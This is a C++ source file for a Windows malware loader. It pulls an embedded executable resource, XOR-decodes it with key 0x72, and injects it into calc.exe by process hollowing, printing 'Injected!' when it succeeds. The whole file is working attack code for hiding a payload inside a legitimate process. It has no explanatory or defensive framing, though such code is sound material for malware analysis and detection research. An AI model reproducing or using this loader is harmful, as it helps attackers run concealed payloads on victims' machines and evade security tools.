#include "process_hollowing.h"
#include "PE.h"
#include <iostream>
#include <string>
using namespace std;
bool get_calc_path(LPWSTR lpwOutPath, DWORD szOutPath)
{
#if defined(_WIN64)
	ExpandEnvironmentStrings(L"%SystemRoot%\\SysWoW64\\calc.exe", lpwOutPath, szOutPath);
#else
	ExpandEnvironmentStrings(L"%SystemRoot%\\system32\\calc.exe", lpwOutPath, szOutPath);
#endif
	printf("%S\n", lpwOutPath);
	return true;
}

void unXor(LPVOID lpBuffer, DWORD dwBufferSize) {
	BYTE* temp = (BYTE*)lpBuffer;

	DWORD i;
	for (i = 0; i < dwBufferSize; i++) {
		BYTE each = *temp;
		if (each != 0 && each != 0x72) {
			*temp = each ^ 0x72;
		}
		temp++;
	}
}
int main(int argc, char* argv[]) {
	HMODULE hFile = GetModuleHandleA(NULL);
	if (!hFile) {
		printf("LoadLibraryA fails\n");
		return -1;
	}
	HRSRC hResource = FindResourceA(
		hFile,
		MAKEINTRESOURCEA(69),
		"EXE"
	);

	if (!hResource) {
		printf("FindResourceA fails. 0x%x\n", GetLastError());
		return -1;
	}

	printf("Found it\n");
	DWORD dwSizeOfResource = SizeofResource(NULL, hResource);
	if (dwSizeOfResource == 0) {
		printf("SizeofResource fails\n");
		return -1;
	}
	HGLOBAL hgResource = LoadResource(
		NULL,
		hResource
	);

	if (!hgResource) {
		printf("LoadResource fails\n");
		return -1;
	}
	LPVOID lpResource = LockResource(hgResource);

	if (!lpResource) {
		printf("LockResource fails\n");
		return -1;
	}

	LPVOID lpBuffer = VirtualAlloc(
		NULL,
		dwSizeOfResource,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);
	if (!lpBuffer) {
		printf("VirtualAlloc fails\n");
		return -1;
	}

	memcpy(lpBuffer, lpResource, dwSizeOfResource);
	unXor(lpBuffer, dwSizeOfResource);
	WCHAR targetPath[MAX_PATH];
	if (!get_calc_path(targetPath, MAX_PATH)) {
		return -1;
	}

	if (processHollowing(targetPath, lpBuffer, dwSizeOfResource)) {
		printf("Injected!\n");
	}
	else {
		printf("Injection failed\n");
	}
	if (lpBuffer) {
		VirtualFree(lpBuffer, dwSizeOfResource, MEM_FREE);
	}
	return 0;
}